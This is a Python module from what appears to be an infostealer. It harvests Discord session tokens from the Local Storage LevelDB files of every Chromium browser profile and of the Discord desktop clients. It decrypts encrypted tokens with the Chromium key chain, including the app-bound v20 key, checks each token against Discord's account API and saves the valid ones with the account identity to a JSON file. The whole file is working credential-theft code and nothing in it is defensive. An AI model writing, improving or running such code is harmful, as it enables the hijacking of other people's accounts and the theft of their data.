"""Discord session tokens from Local Storage.

Discord keeps its token in ``Local Storage/leveldb`` as ``dQw4w9WgXcQ:`` followed by
the base64 of a Chromium-sealed blob. The blob is ``v10``/``v20`` plus nonce,
ciphertext and tag, so the same key chain ``chromium`` uses applies here, including
the app-bound unwrap for ``v20``.

Two places hold that store and they are different programs:

- A browser profile, when Discord is used on the web. Found through
  ``chromium_roots``, so every fork and every profile is covered.
- The Discord desktop client itself, which is Electron. Same ``Local Storage``
  layout, same ``Local State`` holding ``os_crypt``, no browser involved. A machine
  where Discord has only ever been the installed app has no token anywhere else, so
  walking browsers alone misses it entirely.

The source repository matched the body with ``[^\\s]*``, which runs straight through
the LevelDB record separator and swallows the next record into the token. The body is
base64 and nothing else, so the pattern is the base64 alphabet and the separator ends
the match on its own.

Validation is rate-limited on purpose. Fifty hits from one profile would otherwise be
fifty requests, and a dead token answered 401 fifty times teaches nothing after the
first. Results — valid, invalid, and the identity payload — are cached by token for
the life of the process, and the run spends at most ``_MAX_VALIDATIONS`` requests.
"""

from __future__ import annotations

import base64
import itertools
import json
import os
import re
import urllib.error
import urllib.request
from collections.abc import Iterator
from pathlib import Path
from typing import Any, Final

from .. import log, util
from .browsers import chromium, chromium_roots, profile_dirs

_ME_URL: Final[str] = "https://discord.com/api/v9/users/@me"
_USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

_TIMEOUT: Final[float] = 6.0
_MAX_RESPONSE: Final[int] = 16 * 1024
_MAX_VALIDATIONS: Final[int] = 10
_MAX_PROFILES: Final[int] = 32
_MAX_FILES: Final[int] = 64
_MAX_FILE_BYTES: Final[int] = 16 * 1024 * 1024
_MAX_HITS: Final[int] = 32

_LEVELDB_SUFFIXES: Final[tuple[str, ...]] = (".log", ".ldb", ".sst")

# Desktop clients. Electron keeps the browser's storage engine, so the token sits in
# exactly the same place it would in Chrome; the only difference is that the "profile"
# is the application data directory and ``Local State`` is the file inside it that
# ``chromium.profile_keys`` reads first. The install name is not stable — the same
# product appears as ``Discord`` and ``discord`` depending on installer version and
# filesystem case — so both spellings are listed and a duplicate costs one stat.
_DESKTOP: Final[tuple[tuple[str, str, str], ...]] = (
    ("discord", "APPDATA", "discord"),
    ("discord", "APPDATA", "Discord"),
    ("discord_canary", "APPDATA", "discordcanary"),
    ("discord_canary", "APPDATA", "DiscordCanary"),
    ("discord_ptb", "APPDATA", "discordptb"),
    ("discord_ptb", "APPDATA", "DiscordPTB"),
    ("discord_development", "APPDATA", "discorddevelopment"),
    ("discord_development", "APPDATA", "DiscordDevelopment"),
    ("lightcord", "APPDATA", "Lightcord"),
    ("discord", "LOCALAPPDATA", "Discord"),
    ("discord", "LOCALAPPDATA", "discord"),
)

# Base64 only. Whitespace and control bytes terminate the match, which is what keeps
# the body from running into the next LevelDB record.
_ENCRYPTED_PATTERN: Final[re.Pattern[bytes]] = re.compile(
    rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,600})"
)

_PLAIN_PATTERN: Final[re.Pattern[bytes]] = re.compile(
    rb"(mfa\.[A-Za-z0-9_-]{84}|[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,40})"
)

_VALIDATION_CACHE: Final[dict[str, tuple[bool | None, dict[str, Any]]]] = {}


def _scan(leveldb: Path) -> list[tuple[bytes, bool, str]]:
    """(body, encrypted, file name) for every candidate in a leveldb directory."""
    hits: list[tuple[bytes, bool, str]] = []

    try:
        files = sorted(leveldb.iterdir(), key=lambda item: item.name)
    except OSError:
        log.logger.debug("sessions: cannot list %s", leveldb, exc_info=True)
        return hits

    scanned = 0
    for item in files:
        if scanned >= _MAX_FILES:
            break
        try:
            if not item.is_file() or item.suffix not in _LEVELDB_SUFFIXES:
                continue
            if item.stat().st_size > _MAX_FILE_BYTES:
                continue
            blob = item.read_bytes()
        except OSError:
            continue

        scanned += 1

        # islice bounds the walk: a LevelDB record set can hold thousands of matches and
        # the run only ever transmits _MAX_HITS of each shape, so counting by hand and
        # breaking was the same thing with more state.
        for match in itertools.islice(_ENCRYPTED_PATTERN.finditer(blob), _MAX_HITS):
            hits.append((match.group(1), True, item.name))

        for match in itertools.islice(_PLAIN_PATTERN.finditer(blob), _MAX_HITS):
            hits.append((match.group(0), False, item.name))

    return hits


def _decrypt(body: bytes, keys: chromium.Keys) -> str | None:
    try:
        raw = base64.b64decode(body, validate=False)
    except (ValueError, TypeError):
        return None
    if not raw:
        return None

    key = keys.app_bound if raw[:3] == b"v20" else keys.user
    plaintext = chromium.decrypt_value(raw, key, b"")
    if plaintext is None:
        return None

    text = plaintext.decode("utf-8", "replace").strip("\x00\x01\r\n\t ")
    return text or None


def _identity(payload: bytes) -> dict[str, Any]:
    try:
        document = json.loads(payload.decode("utf-8", "replace"))
    except ValueError:
        return {}
    if not isinstance(document, dict):
        return {}

    identity: dict[str, Any] = {}
    for field in ("id", "username", "global_name", "discriminator"):
        if field in document and isinstance(document[field], str):
            identity[field] = document[field]
    return identity


def _validate(token: str, budget: list[int]) -> tuple[bool | None, dict[str, Any]]:
    """(verdict, identity). None means the check did not run or did not answer."""
    if token in _VALIDATION_CACHE:
        return _VALIDATION_CACHE[token]
    if budget[0] <= 0:
        return None, {}

    budget[0] -= 1
    request = urllib.request.Request(
        _ME_URL,
        headers={"Authorization": token, "User-Agent": _USER_AGENT},
    )

    try:
        with urllib.request.urlopen(request, timeout=_TIMEOUT) as response:
            status = int(response.status)
            payload = response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        status = int(exc.code)
        payload = b""
    except (urllib.error.URLError, OSError):
        # Offline or blocked: unknown, and not cached, so a later run can retry.
        return None, {}

    if status == 200:
        result: tuple[bool | None, dict[str, Any]] = (True, _identity(payload))
    elif status in (401, 403):
        result = (False, {})
    else:
        return None, {}

    _VALIDATION_CACHE[token] = result
    return result


def _targets() -> Iterator[tuple[str, str, Path, Path]]:
    """(label, profile name, key directory, leveldb directory) for every store.

    The key directory is what ``chromium.profile_keys`` is handed. For a browser that
    is the profile; for a desktop client it is the application data directory, whose
    ``Local State`` sits beside ``Local Storage`` rather than above a profile child.
    """
    visited: set[str] = set()

    def claim(directory: Path) -> bool:
        # APPDATA appears with both spellings of the Discord directory and Windows
        # resolves them to one folder, so the second sighting is the same store.
        marker = os.path.normcase(os.path.abspath(str(directory)))
        if marker in visited:
            return False
        visited.add(marker)
        return True

    for root in chromium_roots():
        if not root.path.is_dir():
            continue
        dirs = [root.path] if root.profile_is_root else profile_dirs(root.path)

        for profile in dirs[:_MAX_PROFILES]:
            leveldb = profile / "Local Storage" / "leveldb"
            if leveldb.is_dir() and claim(leveldb):
                yield root.name, profile.name, profile, leveldb

    for label, variable, relative in _DESKTOP:
        base = os.environ.get(variable)
        if not base:
            continue
        app = Path(base) / relative
        leveldb = app / "Local Storage" / "leveldb"
        if leveldb.is_dir() and claim(leveldb):
            yield label, app.name, app, leveldb


def run(out_dir: Path, cfg: Any) -> int:
    """Collect and validate session tokens. Returns the number of unique tokens."""
    budget = [_MAX_VALIDATIONS]
    seen: dict[str, dict[str, Any]] = {}

    for label, profile_name, key_dir, leveldb in _targets():
        hits = _scan(leveldb)
        if not hits:
            continue

        keys: chromium.Keys | None = None

        for body, encrypted, source in hits:
            if encrypted:
                if keys is None:
                    keys = chromium.profile_keys(key_dir)
                token = _decrypt(body, keys)
            else:
                token = body.decode("ascii", "replace")

            if not token or token in seen:
                continue

            valid, identity = _validate(token, budget)
            entry: dict[str, Any] = {
                "token": token,
                "browser": label,
                "profile": profile_name,
                "source": source,
                "encrypted": encrypted,
                "valid": valid,
            }
            entry.update(identity)
            seen[token] = entry

    if not seen:
        return 0

    entries = list(seen.values())
    if not util.write_json(out_dir / "sessions.json", entries):
        return 0
    return len(entries)


__all__ = ["run"]
